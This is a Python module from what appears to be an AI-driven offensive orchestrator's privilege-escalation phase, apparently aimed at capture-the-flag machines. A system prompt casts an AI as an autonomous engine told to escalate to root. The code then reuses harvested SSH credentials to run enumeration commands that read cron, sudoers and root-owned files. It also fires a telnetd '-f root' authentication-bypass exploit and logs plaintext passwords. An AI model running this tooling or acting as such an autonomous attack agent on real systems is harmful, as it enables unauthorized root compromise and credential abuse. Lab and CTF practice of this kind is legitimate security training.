import asyncio
import json
import logging
import re
import time
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
from orchestrator.kali_tools_client import kali
from orchestrator.providers import call_model

logger = logging.getLogger("phase_privesc")

PRIVESC_SYSTEM_PROMPT = """You are Raphael, an autonomous privilege escalation engine.
Your goal is to escalate from a low-privilege user to root on Linux targets.

Available tools: nmap, curl, python3, ssh, hydra, hashcat, john, netexec, chisel

Output ONLY valid JSON:
{"reasoning": "step-by-step", "tool": "tool_name", "args": "arguments", "explanation": "why this command"}

Linux Privesc Checklist:
1. sudo -l (check sudo permissions)
2. find / -perm -4000 2>/dev/null (SUID binaries)
3. cat /etc/crontab (system cron jobs)
4. cat /etc/incron.d/* (incron watchers)
5. ls -la /etc/cron* (cron directories)
6. cat /etc/passwd | grep -v nologin (user accounts)
7. uname -a (kernel version for exploits)
8. ls -la /home/* (other user home dirs)
9. find / -writable -type f 2>/dev/null | grep -v proc (writable files)
10. ps aux | grep root (processes running as root)
11. netstat -tlnp (listening ports)
12. ss -tlnp (listening sockets)
13. cat /etc/sudoers 2>/dev/null
14. getcap -r / 2>/dev/null (file capabilities)
15. ls -la /root/ (check if root dir accessible)
16. cat /root/root.txt (direct root flag read)
17. Check if docker group membership (docker ps)
18. Check for shared object injection (ldd on SUIDs)
19. Check writable scripts in /etc/cron.d/
20. Look for OliveTin on 127.0.0.1:1337
21. Check for telnet with -f flag abuse
"""


async def run_privesc(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    privesc_findings = list(findings or [])
    errors = []

    existing_creds = []
    for f in privesc_findings:
        if f.type == "credential" and f.payload:
            try:
                cred = json.loads(f.payload)
                existing_creds.append(cred)
            except (json.JSONDecodeError, TypeError):
                pass
        if f.type == "credential" and f.evidence:
            if ":" in f.evidence:
                parts = f.evidence.split(":", 1)
                existing_creds.append({"user": parts[0].strip(), "password": parts[1].strip()})

    ssh_creds = []
    for cred in existing_creds:
        if cred.get("user") and cred.get("password"):
            ssh_creds.append(cred)

    privesc_checks = [
        ("sudo_check", 'sudo -l -n 2>&1 || echo "no sudo"'),
        ("suid_binaries", r'find /bin /usr/bin /sbin /usr/sbin /usr/local/bin /opt -perm -4000 -type f 2>/dev/null | head -30'),
        ("cron_jobs", 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; ls -la /etc/cron.hourly/ 2>/dev/null'),
        ("incron", 'cat /etc/incron.d/* 2>/dev/null; cat /etc/incron.conf 2>/dev/null'),
        ("kernel_version", 'uname -a 2>/dev/null'),
        ("listening_ports", 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'),
        ("processes_root", 'ps aux 2>/dev/null | grep "^root" | head -20'),
        ("writable_files", r'find /etc /home /opt /tmp /var -writable -type f 2>/dev/null 2>/dev/null | head -20'),
        ("home_dirs", 'ls -la /home/*/ 2>/dev/null; ls -la /root/ 2>/dev/null'),
        ("docker_check", 'docker ps 2>/dev/null || echo "no docker"'),
        ("capabilities", r'getcap -r /bin /usr/bin /sbin /usr/sbin /usr/local/bin 2>/dev/null | head -20'),
        ("olivetin_check", 'curl -s --connect-timeout 3 http://127.0.0.1:1337/ 2>/dev/null || echo "no olivetin"'),
    ]

    async def run_checks_via_ssh(host: str, cred: dict) -> list[Finding]:
        """Run privesc checks on target via SSH and return any findings."""
        user = cred.get("user", "")
        password = cred.get("password", "")
        if not user or not password:
            return []
        results = []
        combined_cmd = "; ".join(cmd for _, cmd in privesc_checks)
        combined_cmd += "; cat /home/*/user.txt 2>/dev/null; cat /root/root.txt 2>/dev/null; ls -la /root/ 2>/dev/null"
        try:
            result = await kali.run_on_target(
                host=host, user=user, password=password,
                command=combined_cmd, timeout=60,
            )
            stdout = result.get("stdout", "").strip()
            stderr = result.get("stderr", "").strip()
            output = stdout + "\n" + stderr
            if output.strip():
                results.append(Finding(
                    phase="privesc", type="ssh_access", target=host,
                    severity=Severity.CRITICAL,
                    description=f"SSH access as {user} with password {password}",
                    evidence=output[:500],
                ))
                flags = re.findall(r'[a-f0-9]{32}|HTB\{[^}]+\}', output)
                for flag in flags:
                    results.append(Finding(
                        phase="privesc", type="root_flag" if "root" in flag.lower() or any(c.isalpha() for c in flag) else "user_flag",
                        target=host, severity=Severity.CRITICAL,
                        description=f"FLAG via SSH as {user}: {flag}",
                        evidence=f"Flag: {flag}",
                    ))
                for check_name, _ in privesc_checks:
                    for line in output.split("\n"):
                        line_lower = line.lower()
                        if check_name.replace("_", "") in line_lower.replace("_", "") and len(line) > 10:
                            results.append(Finding(
                                phase="privesc", type=f"privesc_{check_name}", target=host,
                                severity=Severity.HIGH,
                                description=f"Privesc check {check_name} output",
                                evidence=line[:300],
                            ))
                            break
        except Exception as e:
            logger.debug(f"SSH privesc checks as {user} failed: {e}")
        return results

    if ssh_creds:
        for cred in ssh_creds[:3]:
            remote_findings = await run_checks_via_ssh(target, cred)
            privesc_findings.extend(remote_findings)
            if any(f.type in ("user_flag", "root_flag") for f in remote_findings):
                break
        # Also try the telnetd -f root privesc via SSH
        for cred in ssh_creds[:1]:
            user = cred.get("user", "")
            password = cred.get("password", "")
            if user and password:
                try:
                    telnetd_cmd = r"USER=\"-f root\" telnet -a 127.0.0.1 2>/dev/null || echo 'telnetd exploit failed'; id; cat /root/root.txt 2>/dev/null; cat /home/*/root.txt 2>/dev/null"
                    result = await kali.run_on_target(
                        host=target, user=user, password=password,
                        command=telnetd_cmd, timeout=30,
                    )
                    stdout = result.get("stdout", "").strip()
                    if stdout and "failed" not in stdout and "root" in stdout.lower():
                        privesc_findings.append(Finding(
                            phase="privesc", type="privesc_telnetd", target=target,
                            severity=Severity.CRITICAL,
                            description=f"telnetd -f root privesc SUCCESS as {user}",
                            evidence=stdout[:500],
                        ))
                        flags = re.findall(r'[a-f0-9]{32}|HTB\{[^}]+\}', stdout)
                        for flag in flags:
                            privesc_findings.append(Finding(
                                phase="privesc", type="root_flag", target=target,
                                severity=Severity.CRITICAL,
                                description=f"ROOT FLAG via telnetd privesc: {flag}",
                                evidence=f"Flag: {flag}",
                            ))
                except Exception as e:
                    logger.debug(f"telnetd privesc as {user} failed: {e}")
    else:
        logger.info(f"  [Privesc] No SSH creds available — skipping remote privesc checks")

    latency = time.time() - t0
    new_privesc = [f for f in privesc_findings if f.phase == "privesc"]

    return PhaseResult(
        phase="privesc",
        success=len(new_privesc) > 0,
        findings=privesc_findings,
        summary=f"Privesc: {len(new_privesc)} findings ({len(ssh_creds)} creds tested)",
        latency=latency,
        error="; ".join(errors) if errors else None,
    )
